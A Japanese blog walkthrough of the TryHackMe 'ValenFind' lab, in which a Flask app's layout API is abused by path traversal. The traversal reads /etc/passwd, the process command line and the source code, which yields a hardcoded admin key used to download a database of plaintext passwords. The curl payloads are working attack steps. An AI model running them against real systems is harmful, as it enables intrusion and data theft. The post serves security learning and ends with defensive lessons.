---
author: "ijikeman"
showToc: true
TocOpen: true
title: "TryHackMe: ValenFind Walkthrough"
date: 2026-03-20T00:00:00+09:00
aliases: ["/TryHackMe/valenfind"]
tags: ["TryHackMe", "CTF", "walkthrough", "LFI", "PathTraversal", "SSRF", "Flask"]
categories: ["TryHackMe"]
draft: true
cover:
    image: "/images/eyecatch/TryHackMe/valenfind/index.png"
---

# このページでわかること

* TryHackMe ルーム「ValenFind - Secure Dating」のWalkthrough
* Flask アプリのパストラバーサル (Path Traversal) によるファイル読み取り
* `/proc/self/cmdline` を使ったアプリケーションパスの特定
* ソースコードからハードコードされた API キーを発見し、隠し管理者エンドポイントへアクセス
* SQLite データベースのダウンロードとフラグ取得

# ルーム情報

| 項目 | 内容 |
|------|------|
| ルーム名 | ValenFind - Secure Dating |
| 難易度 | Easy |
| カテゴリ | Web, LFI, Path Traversal |
| OS | Linux (Ubuntu) |
| URL | https://tryhackme.com/room/valenfind |

# 執筆時の環境

* OS: Kali Linux (TryHackMe AttackBox)
* ツール: rustscan, nmap, curl, sqlite3

# 参考サイト

* [TryHackMe 公式](https://tryhackme.com/room/valenfind)
* [OWASP - Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
* [OWASP - Server Side Request Forgery](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)

---

# 1. ポートスキャン

## 1-1. RustScan + Nmap による全ポートスキャン

```bash
rustscan -a 10.48.163.116 --ulimit 5000 -- -sC -sV
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug/3.0.1 Python/3.12.3
```

| ポート | サービス | バージョン | 備考 |
|--------|---------|-----------|------|
| 22/tcp | SSH | OpenSSH 9.6p1 Ubuntu | ログイン可能なユーザーの調査対象 |
| 5000/tcp | HTTP | Werkzeug/3.0.1 Python/3.12.3 | Python Flask アプリ |

* ポート 5000 は Flask 開発サーバーのデフォルトポート
* Werkzeug のレスポンスヘッダーから Python/Flask で実装されていることが確定

---

# 2. 調査 (Enumeration)

## 2-1. アカウント登録とログイン

Flask アプリにアクセスしてテストアカウントを作成し、ログインする。

```bash
# アカウント登録
curl -c /tmp/cookies.txt -b /tmp/cookies.txt -L \
  -X POST http://10.48.163.116:5000/register \
  -d "username=testuser&password=password"

# ログイン
curl -c /tmp/cookies.txt -b /tmp/cookies.txt -L \
  -X POST http://10.48.163.116:5000/login \
  -d "username=testuser&password=password"

# ダッシュボード確認
curl -b /tmp/cookies.txt http://10.48.163.116:5000/dashboard
```

## 2-2. エンドポイントの調査

ログイン後に発見したエンドポイント一覧:

| エンドポイント | 説明 |
|--------------|------|
| `/dashboard` | ユーザー一覧（マッチング候補） |
| `/my_profile` | 自分のプロフィール編集 |
| `/profile/<username>` | 他ユーザーのプロフィール表示 |
| `/like/<id>` | いいね機能 (POST) |
| `/api/fetch_layout?layout=` | レイアウト取得 API (LFI の入口) |
| `/api/admin/export_db` | 管理者専用 DB 取得エンドポイント |

## 2-3. ダッシュボードのユーザー一覧

ダッシュボードには複数のマッチング候補ユーザーが表示される。

| ID | ユーザー名 | Likes | 備考 |
|----|-----------|-------|------|
| 8 | cupid | 999 | 突出した Likes 数 → 管理者アカウントの疑い |

`cupid` ユーザーは Likes 数が 999 と突出しており、管理者アカウントである可能性が高い。

## 2-4. cupid プロフィールページの JavaScript 解析

`/profile/cupid` のページソースを確認すると、怪しい JavaScript コードが埋め込まれていた。

```javascript
function loadTheme(layoutName) {
    fetch(`/api/fetch_layout?layout=${layoutName}`)
        .then(r => r.text())
        .then(html => {
            document.getElementById('bio-container').innerHTML = rendered;
        });
}
```

`?layout=` パラメータにファイル名を渡すと、サーバーがそのファイルを読んで返す構造になっている。入力値の検証が不十分であれば、パストラバーサルで任意のファイルを読み取れる可能性がある。

---

# 3. 攻撃 (Exploitation)

## 3-1. Step 1: パストラバーサルで `/etc/passwd` を取得

`../` を繰り返してWebルートの外のファイルを読み取れるか試す。

```bash
curl -b /tmp/cookies.txt \
  "http://10.48.163.116:5000/api/fetch_layout?layout=../../../../etc/passwd"
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
ubuntu:x:1000:1000:ubuntu:/home/ubuntu:/bin/bash
```

パストラバーサルに成功。`/etc/passwd` の内容が取得できた。ログイン可能なユーザーは `root` と `ubuntu` であることがわかる。

## 3-2. Step 2: `/proc/self/cmdline` でアプリのパスを特定

Linuxの `/proc/self/cmdline` には、現在実行中のプロセスのコマンドライン引数が記録されている。これを読み取ることで Flask アプリの実際のパスを特定できる。

```bash
curl -b /tmp/cookies.txt \
  "http://10.48.163.116:5000/api/fetch_layout?layout=../../../../proc/self/cmdline"
```

```
/usr/bin/python3 /opt/Valenfind/app.py
```

アプリのソースコードは `/opt/Valenfind/app.py` に配置されていることが判明した。

## 3-3. Step 3: ソースコード (`app.py`) を取得

特定したパスを使ってアプリのソースコードを直接読み取る。

```bash
curl -b /tmp/cookies.txt \
  "http://10.48.163.116:5000/api/fetch_layout?layout=../../../../opt/Valenfind/app.py"
```

ソースコードから複数の重要な情報が見つかった。

### 発見1: 管理者 API キーがハードコード

```python
ADMIN_API_KEY = "CUPID_MASTER_KEY_2024_XOXO"
```

本番環境の秘密情報が平文でソースコードに直書きされている。

### 発見2: DB をダウンロードできる隠しエンドポイント

```python
@app.route('/api/admin/export_db')
def export_db():
    auth_header = request.headers.get('X-Valentine-Token')
    if auth_header == ADMIN_API_KEY:
        return send_file('cupid.db', as_attachment=True)
    else:
        return jsonify({"error": "Forbidden"}), 403
```

`X-Valentine-Token` ヘッダーに正しい API キーを渡すと、データベースファイルをダウンロードできる。

### 発見3: パスワードが平文で保存

```python
if user and user['password'] == password:  # ハッシュ化なし！
```

パスワードがハッシュ化されずに平文のまま DB に保存されている。DB が漏洩すれば全ユーザーのパスワードが即座に判明する。

### 発見4: `fetch_layout` のフィルターは不完全

```python
if 'cupid.db' in layout_file or layout_file.endswith('.db'):
    return "Security Alert: Database file access is strictly prohibited."
# → ../.. でのパストラバーサルは防いでいない！
```

DB への直接アクセスを防ぐフィルターはあるが、パストラバーサル自体は防いでいないため、`/proc/self/cmdline` やソースコードの読み取りは可能だった。

## 3-4. Step 4: DB をダウンロードしてフラグを取得

取得した API キーを使って DB をダウンロードする。

```bash
curl -o /tmp/cupid.db \
  -H "X-Valentine-Token: CUPID_MASTER_KEY_2024_XOXO" \
  "http://10.48.163.116:5000/api/admin/export_db"
```

```bash
sqlite3 /tmp/cupid.db "SELECT id, username, password, real_name, email FROM users;"
```

全ユーザーのパスワードが平文で取得できた。`cupid` ユーザーの `email` フィールドにフラグが含まれていた。

---

# 4. フラグ取得

| フラグ | 取得場所 | 取得方法 |
|--------|---------|---------|
| THM{...} | DB の `cupid` ユーザー `email` フィールド | `/api/admin/export_db` から DB をダウンロードして sqlite3 で参照 |

---

# 5. まとめ

## 攻略フロー

```
RustScan + Nmap
  → ポート 22 (SSH), 5000 (Flask) を発見
    → アカウント登録・ログイン
      → cupid プロフィールの JS から /api/fetch_layout?layout= を発見
        → パストラバーサルで /etc/passwd 取得
          → /proc/self/cmdline でアプリパスを特定 → /opt/Valenfind/app.py
            → ソースコード取得 → ADMIN_API_KEY 発見
              → /api/admin/export_db で DB ダウンロード
                → DB 内の cupid ユーザーの email フィールドにフラグ
```

## 習得スキル

| スキル | 内容 |
|--------|------|
| パストラバーサル | `../` を繰り返して Web ルート外のファイルを読む手法 |
| LFI (Local File Inclusion) | サーバー上のファイルを Web から読み取る脆弱性 |
| `/proc/self/cmdline` の活用 | 実行中プロセスのコマンドラインからアプリパスを特定 |
| ソースコード読解 | ハードコードされた秘密情報・隠しエンドポイント・認証バイパスを発見 |
| SQLite 解析 | ダウンロードした DB から情報を抽出する |

## ハマったポイント

* `fetch_layout` に `cupid.db` への直接アクセスを防ぐフィルターが存在するが、パストラバーサルそのものは防いでいない。フィルターの存在に気づいて回り道を検討する必要があった。
* `/proc/self/cmdline` を使ってアプリのパスを特定するアイデアが鍵。`/etc/passwd` だけで満足せず、さらに調査を続けることが重要。

## セキュリティ上の教訓

1. **入力値のサニタイズ**: `../` を含むパスを検出・除去するフィルターを実装する必要がある
2. **秘密情報のハードコード禁止**: API キーや認証情報は環境変数や Secrets Manager で管理する
3. **パスワードのハッシュ化**: bcrypt や argon2 等のアルゴリズムを使い、平文保存を避ける
4. **最小権限の原則**: Web プロセスが `/opt/` 以下のソースコードを読めないよう権限を絞る

> **注意**: このウォークスルーは TryHackMe の許可された環境内で行った学習記録です。実際のシステムへの無断アクセスは違法です。セキュリティの知識は防御目的に活用してください。
